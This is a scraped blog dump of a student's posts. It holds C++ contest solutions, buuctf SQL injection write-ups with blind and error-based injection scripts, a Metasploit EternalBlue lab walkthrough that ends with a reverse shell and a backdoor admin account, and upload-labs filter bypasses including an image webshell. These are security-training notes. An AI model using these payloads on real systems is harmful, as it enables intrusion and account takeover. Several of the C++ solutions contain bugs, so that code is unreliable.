cout&lt;&lt;sum&lt;&lt;endl; &#125; return 0; &#125; 问题 D: 海之征途——孙策题目描述孙策是王者峡谷里的坦克/战士。大船靠岸，江郡欢呼着迎来了他们的新领袖，人称江东小霸王的年轻人。游戏中，孙策的技能长帆破浪，可以驾船冲锋，可将船撞向敌方单位或者阻挡物，并造成一定的伤害。 现在，有一群好奇的江郡小朋友想跟着孙策一起出海航行，但孙策的船承载不了所有小朋友，所以孙策决定，尽可能带更多的小朋友出海，现在请你帮孙策谋一个策略，使得更多的小朋友有机会出海航行。已知的条件是孙策船的最大载重m，以及n个小朋友的体重。 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=1000），代表测试用例个数。 每组测试用例第一行有两个整数m和n。（0&lt;=m&lt;=1000， 0&lt;=n&lt;=1000），分别代表船的载重重量和小朋友的个数，接下来一行为n个小朋友的体重。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表最多能有ans个小朋友跟着一起出海。 样例输入2 10 4 3 5 2 4 20 9 3 5 2 4 6 1 8 5 9 样例输出3 6 提示就是简单的装在问题 #include&lt;bits/stdc++.h&gt; using namespace std; int T,m,n; int w[1005]; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int ans=0; cin&gt;&gt;m&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;w[i]; &#125; sort(w,w+n); for(int i=0;i&lt;n;i++) &#123; if(m&gt;=w[i]) &#123; ans++; m-=w[i]; &#125; else break; &#125; cout&lt;&lt;ans&lt;&lt;endl; &#125; return 0; &#125; 问题 E: 极冰防御——盾山题目描述盾山是王者峡谷里的辅助，一夫当关、万夫莫开，一个好的辅助往往可以给团队带来极大帮助。 盾山的游戏中的一个技能为不动如山：手握一块由石头组成的巨盾，张开巨盾砸向地面，将敌人推开，并持续一段时间。 假设盾山最多只能承受C重量的盾牌，而现在有N个小石头，每个石头i的重量为Wi，防御值为Pi。那么，呆萌的盾山想知道，他从N个小石头中挑选M个（M&lt;=N）组成他可承受盾牌，最大的防御值是多少？ 输入多组测试用例。第一行输入包含一个整数T（1&lt;=T&lt;=10），代表测试用例个数。 接下来有T组测试用例。每组测试用例第一行为盾山承受盾牌的最大重量C(C&lt;10000)和小石头的个数N(N&lt;1000)。接下来的N行分别为小石头的重量Wi(1&lt;=Wi&lt;=100)和防御值Pi(1&lt;=Pi&lt;=3000000)。 输出每组测试用例对应一行输出，每行输出一个整数ans，代表可承受盾牌的最大防御值。 样例输入1 10 5 2 6 2 3 6 5 5 4 4 6 样例输出15 提示01背包问题，不知道下面的解能不能过 #include&lt;bits/stdc++.h&gt; using namespace std; const int N=1e5+5; long long ans[N]; int w[N],v[N]; int T; int main() &#123; cin&gt;&gt;T; while(T--) &#123; int C,N; memset(ans,0,sizeof(ans)); cin&gt;&gt;C&gt;&gt;N; for(int i=0;i&lt;N;i++) &#123; cin&gt;&gt;w[i]&gt;&gt;v[i]; &#125; for(int i=0;i&lt;N;i++) &#123; for(int j=C;j&gt;=w[i];j--) ans[j]=max(ans[j-1],ans[j-w[i]]+v[i]); &#125; // for(int i=0;i&lt;=C;i++) // cout&lt;&lt;ans[i]&lt;&lt;endl; cout&lt;&lt;ans[C]&lt;&lt;endl; &#125; return 0; &#125; ps:以上代码没有提交测试环境，只是过了给出的测试样例。 dfs大合集迷宫问题题目描述小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---## 样例输出9 #include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,int&gt; P; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;P&gt; qu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;T&#x27;) //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125; acwing迷宫问题#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int dis[N][N]; typedef pair&lt;int,int&gt; P; int n,m; int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; int x,y,nx,ny; void dfs() &#123; memset(dis,-1,sizeof(dis)); queue&lt;P&gt; qu; qu.push(P(0,0)); dis[0][0]=0; while(!qu.empty()) &#123; P p=qu.front(); qu.pop(); x=p.first,y=p.second; if(x==n-1&amp;&amp;y==m-1) break; for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i],ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;m&amp;&amp;dis[nx][ny]==-1&amp;&amp;mp[nx][ny]==0) &#123; qu.push(P(nx,ny)); dis[nx][ny]=dis[x][y]+1; &#125; &#125; &#125; if(dis[n-1][m-1]!=-1) cout&lt;&lt;dis[n-1][m-1]; return; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;m; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;m;j++) cin&gt;&gt;mp[i][j]; dfs(); return 0; &#125; n皇后问题#include&lt;bits/stdc++.h&gt; using namespace std; int n,ans=0; const int N=20; char m[N][N]; bool col[N],dg[N],udg[N]; void dfs(int u) &#123; if(u==n) &#123; // for(int i=0;i&lt;n;i++) // cout&lt;&lt;m[i]&lt;&lt;endl; ans++; return; &#125; for(int i=0;i&lt;n;i++) &#123; if(!col[i]&amp;&amp;!dg[i+u]&amp;&amp;!udg[n-u+i]) &#123; m[u][i]=&#x27;Q&#x27;; col[i]=dg[i+u]=udg[n-u+i]=1; dfs(u+1); col[i]=dg[i+u]=udg[n-u+i]=0;//回溯恢复现场 m[u][i]=&#x27;.&#x27;; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) for(int j=0;j&lt;n;j++) m[i][j]=&#x27;.&#x27;; dfs(0); cout&lt;&lt;ans; return 0; &#125; m图着色问题题目描述给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。 输入第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色接下来k行，每行2个正整数，表示一条边的两个顶点 输出所有不同的着色方案数 样例输入5 8 4 1 2 1 3 1 4 2 3 2 4 2 5 3 4 4 5 样例输出48 提示#include&lt;bits/stdc++.h&gt; using namespace std; const int N=105; int mp[N][N]; int color[N]=&#123;0&#125;; int n,k,m,ans=0; void dfs(int d) &#123; if(d==n+1) &#123; ans++; return; &#125; for(int i=1;i&lt;=m;i++) &#123; int flag=1; for(int j=1;j&lt;=n;j++) &#123; if(mp[d][j]&amp;&amp;color[j]==i) &#123; flag=0; break; &#125; &#125; if(flag) &#123; color[d]=i; dfs(d+1); color[d]=0; &#125; &#125; &#125; int main() &#123; cin&gt;&gt;n&gt;&gt;k&gt;&gt;m; for(int i=0;i&lt;k;i++) &#123; int t1,t2; cin&gt;&gt;t1&gt;&gt;t2; mp[t1][t2]=1; mp[t2][t1]=1; &#125; dfs(1); cout&lt;&lt;ans&lt;&lt;endl; return 0; &#125; 部分和题目描述给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。 输入多组测试用例。 对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。 1*≤N≤*20，输入整数及k均小于1e8。 输出若可以使得和为k，输出”Yes”,否则”No”。 样例输入4 1 2 4 7 13 样例输出Yes #include&lt;bits/stdc++.h&gt; using namespace std; int s[25]; int n,m; bool check(int l,int a) &#123; if(a==m) return true; if(l==n) return false; if(check(l+1,a+s[l])) return true; if(check(l+1,a)) return true; &#125; int main() &#123; cin&gt;&gt;n; for(int i=0;i&lt;n;i++) &#123; cin&gt;&gt;s[i]; &#125; cin&gt;&gt;m; if(check(0,0)) cout&lt;&lt;&quot;YES&quot;; else cout&lt;&lt;&quot;NO&quot;; return 0; &#125;","tags":[]},{"title":"buuctf-LFI","date":"2020-10-08T12:35:05.000Z","path":"2020/10/08/buuoj-LFI/","text":"","tags":[{"name":"LFI","slug":"LFI","permalink":"https://sunzhengyu99.github.io/tags/LFI/"}]},{"title":"buuctf-sql注入","date":"2020-10-05T10:29:30.000Z","path":"2020/10/05/buuoj/","text":"buuctf–注入篇 [CISCN2019 华北赛区 Day2 Web1]Hack World给了提示，All You Want Is In Table &#39;flag&#39; and the column is &#39;flag&#39; 猜测flag在flag 表中，查询语句应该是 select flag from flag 经过测试，发现这题过滤了很多关键字，or,union,order等，猜测是盲注 构造盲注语句 id=if((ascii(substr((select(flag)from(flag)),0,1))&gt;90),1,2) 两次的提示语句不一样，说明这个注入语句是对的，且当提示Hello时应该是对的。 // 二分注入 import requests url = &quot;http://376688f4-59c4-4f47-8d0e-36c966e45631.node3.buuoj.cn/index.php&quot; data = &#123;id : &quot;&quot;&#125; flag = &quot;&quot; for i in range(50): left = 33 right = 128 mid = (right + left) &gt;&gt; 1 while(right&gt;left): data[&quot;id&quot;] = &quot;if((ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;),1,2)&quot;.format(i,mid) response = requests.post(url,data=data) if &quot;Hello&quot; in response.text: left = mid+1 else: right = mid mid=(right+left)&gt;&gt;1 flag = flag + chr(mid) print(flag) print(flag) [极客大挑战 2019]HardSQL报错注入 测试发现or,union,substr,空格,/**/等都被加入黑名单，双写也无法绕过 可是使用报错注入 报错注入原理： 其原因主要是因为虚拟表的主键重复。按照MySQL的官方说法，group by要进行两次运算，第一次是拿group by后面的字段值到虚拟表中去对比前，首先获取group by后面的值；第二次是假设group by后面的字段的值在虚拟表中不存在，那就需要把它插入到虚拟表中，这里在插入时会进行第二次运算，由于rand函数存在一定的随机性，所以第二次运算的结果可能与第一次运算的结果不一致，但是这个运算的结果可能在虚拟表中已经存在了，那么这时的插入必然导致主键的重复，进而引发错误。 相关链接 https://www.cnblogs.com/richardlee97/p/10617115.html https://www.jianshu.com/p/d8ae3e8dabdc https://blog.csdn.net/qq_37873738/article/details/88042610 UPDATEXML (XML_document, XPath_string, new_value);第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) 。第三个参数：new_value，String格式，替换查找到的符合条件的数据 查询语句如下 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;H4rDsq1&#x27;)),0x7e),1))%23 ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(password)from(H4rDsq1)),0x7e),1))%23 这里会发现flag显示不全，可能是报错现实的字数限制，利用right/left函数，显示部分的flag，之后拼接起来 显示后面的flag ?username=admin&amp;password=dad%27or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)),0x7e),1))%23 [网鼎杯 2018]Fakebooksql注入+反序列化+代码审计 [GXYCTF2019]BabySQli下载的源码，有助于后面做题 mysqli_query($con,&#x27;SET NAMES UTF8&#x27;); $name = $_POST[&#x27;name&#x27;]; $password = $_POST[&#x27;pw&#x27;]; $t_pw = md5($password); //对传入的password参数进行了md5加密 $sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;; // echo $sql; $result = mysqli_query($con, $sql); if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123; // 过滤了() | = or die(&quot;do not hack me!&quot;); &#125; else&#123; if (!$result) &#123; printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); exit(); &#125; else&#123; // echo &#x27;&lt;pre&gt;&#x27;; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; // echo $flag; &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; else&#123; die(&quot;wrong user!&quot;); &#125; &#125; &#125; 随便输入用户名和密码，查看源码，出现提示 试了试应该是base32，解码后是base64 c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw== 继续解码 select * from user where username = &#x27;$name&#x27; 注入点是name参数这里，与上面源码中的查询语句一样。 经过测试发现有三列，name=admin&#39; union select 1,2,3 #&amp;pw=as#显示正常，name=admn&#39; union select 1,2,3,4#&amp;pw=as报错 但是页面没有数字回显，所以常规的注入应该是不行的。 值得注意的是，这题可以知道username是admin， 输入username=admin&amp;password=11,时提示wrong pass! 输入username=admn&amp;password=11,时提示wrong user!，所以可以判断用户名为admin 接下来介绍一种新的union注入 先建立一张表 select * from test where id=0 union select 1,&#x27;admin&#x27;,&#x27;2322&#x27;; union语句后查询的是表中不存在的一个数据，查询结果如下 这个结果说明，union查询一个不存在的数据时，会建立一个虚拟表，其中放着所查询到的数据和union后包含的数据 这里就是 id=1,username=admin,password=2322 这样就可以利用这个改变数据库中用户的密码，然后用自己设置的密码登录 接下来，利用这点做这个题目，首先知道一共三列，第一列应该是id，知道之后两列的内容就可以了 name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11提示的wrong user! name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11提示的wrong pass! 第二列的字段名应该就是username，第三列自然就是password，但是这题的password字段存放的时md5加密后的内容（看到师傅们的wp才知道的，看到源码也确实这样，但是在比赛的时候这么发现不得而知） payload: name=000&#x27;union select 1,&#x27;admin&#x27;,&#x27;b59c67bf196a4758191e42f76670ceba&#x27;#&amp;pw=1111 b59c67bf196a4758191e42f76670ceba是1111的md5值，pw的值为1111 [极客大挑战 2019]FinalSQL与hard sql是一个系列的，但是这个应该是盲注 在search.php中找到注入点，测试可以发现是数字型注入 fuzz之后可以发现对于不同的字符，回显不同，并且过滤了空格，但是^没有被过滤，所以可以利用这个符号 可以看到当id = 1 时，页面回显为，可以将这个为判断的标志 1^1^1 = 1 1^0^1 = 0 所以可以将注入的payload加到中间，例如 1^(ord(substr((select(group_concat(schema_name))from(information_schema.schema ta)),%d,1))=%d)^1&quot;%(i,ord(j)) 注入脚本如下，使用的是二分法 import requests import time url = &quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot; flag = &#x27;&#x27; def payload(i, j): time.sleep(1) # sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j) #数据库名字 # sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j) #表名 # sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j) #列名 sql = &quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; % (i, j) data = &#123;&quot;id&quot;: sql&#125; r = requests.get(url, params=data) if &quot;Click&quot; in r.text: res = 1 else: res = 0 return res def exp(): global flag for i in range(1, 10000): print(i, &#x27;:&#x27;) low = 31 high = 127 while low &lt;= high: mid = (low + high) // 2 res = payload(i, mid) if res: low = mid + 1 else: high = mid - 1 f = int((low + high + 1)) // 2 if (f == 127 or f == 31): break # print (f) flag += chr(f) print(flag) exp() print(&#x27;flag=&#x27;, flag) 又学到了新的注入姿势，真不错 参考：https://www.cnblogs.com/wangtanzhi/p/12305052.html","tags":[{"name":"二分注入","slug":"二分注入","permalink":"https://sunzhengyu99.github.io/tags/%E4%BA%8C%E5%88%86%E6%B3%A8%E5%85%A5/"},{"name":"报错注入","slug":"报错注入","permalink":"https://sunzhengyu99.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"name":"union新姿势","slug":"union新姿势","permalink":"https://sunzhengyu99.github.io/tags/union%E6%96%B0%E5%A7%BF%E5%8A%BF/"}]},{"title":"网安作业1","date":"2020-09-27T14:21:14.000Z","path":"2020/09/27/homework/","text":"MS17-010 1.准备工作开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方 将两台虚拟机桥接到同一网卡，并保证能够通信 Kali IP 10.1.1.1 255.0.0.0 win7 IP 10.1.1.2 255.0.0.0 测试两台主机之间的通信情况 使用msf前需要开启postgresql服务 开启服务：service postgresql start 查看服务状态：service postgresql status 开到绿色字体的active即为开启了 初始化数据库：msfdb init 2. 攻击过程(1).首先判断目标主机是否打开445端口使用nmap+ip 扫描 (2) .确认目标主机打开445端口后直接使用msf进行攻击输入msfconsole 启动msf 输入search MS17-010 找到exploit windows/smb/ms17_010_eternalblue, 运行 use exploitwindows/smb/ms17_010_eternalblue 输入 show options 查看需要配置哪些信息 RHOSTS 为目标主机IP(10.1.1.2) RPORT 为目标端口号(445) LHOST 为监听主机IP(10.1.1.1) (3). 配置成功后设置tcp连接输入命令 set payload windows/x64/meterpreter/reverse_tcp (4).开始运行输入 exploit/run 成功获取shell 查看ip地址验证是否为目标主机。 (5)设立后门，在目标主机中创建一个用户创建一个用户 net user test abc123.com /add Username:test password:abc123.com 将该用户加入管理员组，使其拥有管理员权限 net localgroup administrtors test /add 目标主机上用户创建成功 实验结束","tags":[{"name":"msf","slug":"msf","permalink":"https://sunzhengyu99.github.io/tags/msf/"}]},{"title":"upload-11-21","date":"2020-09-18T13:58:51.000Z","path":"2020/09/18/upload2/","text":"upload-labs 11-21 pass11$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 这段代码是将文件名中出现 deny_ext的后缀名替换为空 可以双写绕过，即1.pphphp pass12$is_upload = false; $msg = null; if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else&#123; $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125; &#125; 本题与之前的题目有所不同，这题的文件的保存路径是可以控制的 这里用的%00截断，原理如下 www.xxx.com/qq.jpg www.xxx.com/qq.php%00.jpg =&gt; www.xxx.com/qq.php其后缀名为.jpg可以绕过检测，但是windows系统处理时不会处理%00之后的内容故保存的文件就是qq.php pass13这题与上题利用的原理相同 但是这里要使用 00的二进制形式 pass14明确说了上传图片木马 function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType; &#125; GIF89a 是GIF图片的文件头 ，是为了绕过gif文件的检查 图片木马的制作 桌面建立一个文本文件将其改为2.jpg，再建立一个改为1.php,其内容为你想添加的一句话木马 copy 2.jpg /b + 1.php /a webshell.jpg 未完待续。。。","tags":[{"name":"双写绕过","slug":"双写绕过","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87/"},{"name":"00截断","slug":"00截断","permalink":"https://sunzhengyu99.github.io/tags/00%E6%88%AA%E6%96%AD/"}]},{"title":"uploads-labs","date":"2020-09-16T13:48:48.000Z","path":"2020/09/16/uploads/","text":"upload-labs 1-10 pass1直接抓包修改文件后缀名为jpg,png,gif即可 pass2查看源码 if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) 这段代码说明是对文件的MIME类型进行了过滤，直接上传 1.php 抓包后修改文件类型为 &#39;image/jpeg&#39; ,&#39;image/png&#39;,&#39;image/gif&#39;,这三个类型都为图片 抓包修改MIME即可 知识点补充： MIME类型对大小写不敏感，但是传统写法都是小写。 text/plain text/html image/jpeg image/png audio/mpeg audio/ogg audio/* video/mp4 application/* application/json application/javascript application/ecmascript application/octet-stream 更详细的解释， pass3$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); 只禁止了.asp,.aspx,.php,.jsp后缀文件，可以使用php3,php5,php7,phtml等等后缀名绕过 pass4.htaccess文件的作用 URL重写、自定义错误页面 MIME类型配置 访问权限控制等 主要体现在伪静态的应用 图片防盗链 自定义404错误页面 阻止/允许特定IP/IP段 目录浏览与主页 禁止访问指定文件类型 文件密码保护 &lt;FilesMatch &quot;1.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 这几句代码的意思： 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件， 无论扩展名是什么(没有也行)，都以php的方式来解析 上传完.htaccess文件后直接上传一个 1.jpg即可 pass5$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125; &#125; 本题与第十题完全一样，详细解答见第十题 pass6$is_upload = false; $msg = null; if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; 